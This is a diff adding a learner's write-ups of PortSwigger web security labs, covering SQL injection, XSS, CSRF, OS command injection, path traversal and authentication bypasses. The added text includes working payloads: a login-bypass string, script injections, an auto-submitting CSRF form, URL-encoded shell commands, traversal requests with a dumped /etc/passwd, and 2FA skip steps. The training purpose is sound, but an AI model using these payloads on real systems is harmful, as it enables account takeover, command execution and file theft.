@@ -189,6 +189,11 @@ This is a simple challenge to introduce you to the idea of SQL injection. Given 
 
 ### :material-gauge-empty: Vulnerability allowing login bypass
 
+!!! question
+    This lab contains an SQL injection vulnerability in the login function.
+
+    To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.
+
 This is another simple case wherein you are encouraged to log in at a standard username/password form (https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login). Much like the prior example, however, you can manipulate the query directly by providing a username of `administrator'--` and any value for the password field. This terminates the query that is presumeably something like 
 `SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'`. It results in the following query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'`
 
@@ -221,6 +226,11 @@ Similar to the prior
 Visiting the site, there is a search form. I searched for `test` and was redirected to `t/?search=test`. I then searched for `test <script>alert();</script>` and, not surprisingly, I receieved an alert and completed the lab.
 
 ### :material-gauge-empty: Stored XSS into HTML context with nothing encoded
+
+!!! question
+    This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+    To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.
 
 Found an comment form on the website and submitted the following: `This is awesome!<script>alert('you stink');</script>`. Once I submitted and then visited the post again, the alert was triggered and the lab was solved.
 
@@ -264,7 +274,7 @@ Doing an ill-informed attempt results in DOM that looks like the following (and 
 I went down a failed rathole here a bit before I read https://portswigger.net/web-security/cross-site-scripting/dom-based and noticed that the `innerHTML` sink doesn't accept `script` elements and, as such, you need to use other elements usch as `img` or `iframe`. I used the example directly from the page (`<img src=1 onerror=alert(document.domain)>`) and it worked successfully.
 
 
-### DOM XSS in jQuery anchor href attribute sink using location.search source
+### :material-gauge-empty: DOM XSS in jQuery anchor href attribute sink using location.search source
 
 !!! question
     This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
@@ -299,6 +309,30 @@ Pressing the `View Exploit` button made it clear that it was working (couldn't g
 
 ## Cross-site Request Forgery (CSRF)
 
+### CSRF vulnerability with no defenses
+
+!!! question
+    This lab's email change functionality is vulnerable to CSRF.
+
+    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
+
+    You can log in to your own account using the following credentials: `wiener:peter`
+
+This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:
+
+```html
+<html>
+  <body>
+    <form action="https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
 ## Clickjacking
 
 ## DOM-based Vulnerabilities
@@ -313,15 +347,255 @@ Pressing the `View Exploit` button made it clear that it was working (couldn't g
 
 ## OS Command Injection
 
+### :material-gauge-empty: OS command injection, simple case
+
+!!! question
+    This lab contains an OS command injection vulnerability in the product stock checker.
+
+    The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
+
+    To solve the lab, execute the `whoami` command to determine the name of the current user.
+
+This application issues a `POST` reequest to the `/product/stock` endpoint with the following expected payload: `productId=1&storeId=1`. With valid values, you receive something like `62` as the payload of the response.
+
+The instructions and page make it appear as though you simply change the values to `echo test` or something like `productId=& whoami &storeId=1` but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following:
+
+```text
+productId=%26%20echo%20george%20%26&storeId=whoami
+```
+
+Which gave me a return like this:
+
+```text
+george
+peter-tVfyfI
+```
+
+I'm *certain* there are other variations that will produce the right results. 
+
+### :material-gauge: Blind OS command injection with time delays
+
+!!! question
+    This lab contains a blind OS command injection vulnerability in the feedback function.
+
+    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
+
+    To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
+
+I modified the request as follows (`& sleep 10 &`):
+
+```text
+csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26
+```
+
+This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) *both* the `email` and `subject` params need to have the sleep command, otherwise it simply returns immediately.
+
+
+### :material-gauge: Blind OS command injection with output redirection
+
+!!! question
+    This lab contains a blind OS command injection vulnerability in the feedback function.
+
+    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
+
+    `/var/www/images/`
+
+    The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
+
+    To solve the lab, execute the `whoami` command and retrieve the output.
+
+To solve this challenge, I crafted a string: `& whoami > /var/www/images/bubba &` and then fully URL-encoded it as `%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26`. 
+
+Using the information from the prior challenge, I substituted my command payload in both the `email` and `subject` fields as such:
+
+```text
+csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test
+```
+
+And submitted it. I then found an image-returning request and modified the path to my newly-created file: `GET /image?filename=bubba HTTP/1.1` and I was presented with the currently running user: `peter-rYqzDj`
+
+
+
 ## Server-Side Template Injection
 
 ## Directory Traversal
+
+### :material-gauge-empty: File path traversal, simple case
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+!!! tip
+    I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is `image/jpeg` and since I'm pulling text (the `/etc/passwd` file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool.
+
+Poking around a bit and found that the site dynamically loads images using the following structure:
+
+```text
+https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
+```
+
+I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the `filename` parameter to be `image?filename=../../../etc/passwd` and then sent the request. The response looked like the following:
+
+```text
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Connection: close
+Content-Length: 1260
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/home/academy:/bin/bash
+dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
+```
+
+### :material-gauge: File path traversal, traversal sequences blocked with absolute path bypass
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+This one was pretty easy. Given a request like the following:
+
+```text
+GET /image?filename=48.jpg HTTP/1.1
+```
+
+I confirmed that it didn't work the "easy way" by testing this:
+
+```text
+GET /image?filename=../../../etc/passwd HTTP/1.1
+```
+
+And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:
+
+```text
+GET /image?filename=/etc/passwd HTTP/1.1
+```
+
+And was rewarded with the contents of the `/etc/passwd` file.
+
+
+### :material-gauge: File path traversal, traversal sequences stripped non-recursively
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    The application strips path traversal sequences from the user-supplied filename before using it.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+The key to solving this lab is that the server-side code appears to be looking for instances of `../` and stripping them, but _non-recursively_. This means, that they might have a line that looks like the following bit of python:
+
+```python
+safe_path = requested_path.replace("../", "")
+```
+
+If you provide a request that looks like this: `/image?filename=....//....//....//etc/passwd`, the value of `safe_path` still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.
+
+### :material-gauge: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+On this one, I tried URL-encoding the traversal attack as follows:
+
+```text
+GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
+```
+
+You see that each `.` becomes `%2e` and each `/` becomes `%2f`. But this didn't work. I then tried *double* URL encoding the path as shown below, which **did** work.
+
+```text
+GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
+```
+
+The problem or *bug* in this application is that they called a "safe" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time *after* checking for path traversal issues. This could almost be considered a TOCTOU type bug.
+
+
+### :material-gauge: File path traversal, validation of start of path
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+Within the HTTP request log, I found a request that looks like this:
+
+```text
+GET /image?filename=/var/www/images/47.jpg HTTP/1.1
+```
+
+I modified it as follows:
+
+```text
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+```
+
+After submission, I was presented the `/etc/passwd` file.
+
+
+### :material-gauge: File path traversal, validation of file extension with null byte bypass
+
+!!! question
+    This lab contains a file path traversal vulnerability in the display of product images.
+
+    The application validates that the supplied filename ends with the expected file extension.
+
+    To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+If you take the time to [read the documentation](https://portswigger.net/web-security/file-path-traversal) on this type of issue, the solution becomes quite straight forward. The following `GET` request does the trick:
+
+```text
+GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+```
 
 ## Access Control Vulnerabilities
 
 ## Authentication
 
-### Username enumeration via different responses
+### :material-gauge-empty: Username enumeration via different responses
+
+!!! question
+    This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
+
+    Candidate usernames
+    Candidate passwords
+
+    To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
+
 
 Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page.
 
@@ -341,7 +615,13 @@ Here are the steps I took to solve this challenge:
 1. Watching the response lengths, I again noticed taht one of them (password: `robert`) had a different length. Inspecting the response showed that user had logged in. 
 1. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge
 
-### 2FA simple bypass
+### :material-gauge-empty: 2FA simple bypass
+
+!!! question
+    This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
+
+    Your credentials: `wiener:peter`
+    Victim's credentials `carlos:montoya`
 
 Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page.
 
@@ -349,7 +629,13 @@ Walking through the auth flow with a valid user is pretty straight foward. You l
 
 The "attack" is as simple as completing the first stage with the victim's credentials and then changing the URL to `/my-account`. This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).
 
-### Password reset broken logic
+### :material-gauge-empty: Password reset broken logic
+
+!!! question
+    This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
+
+    Your credentials: `wiener:peter`
+    Victim's username: `carlos`
 
 Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the "my account" page.
 
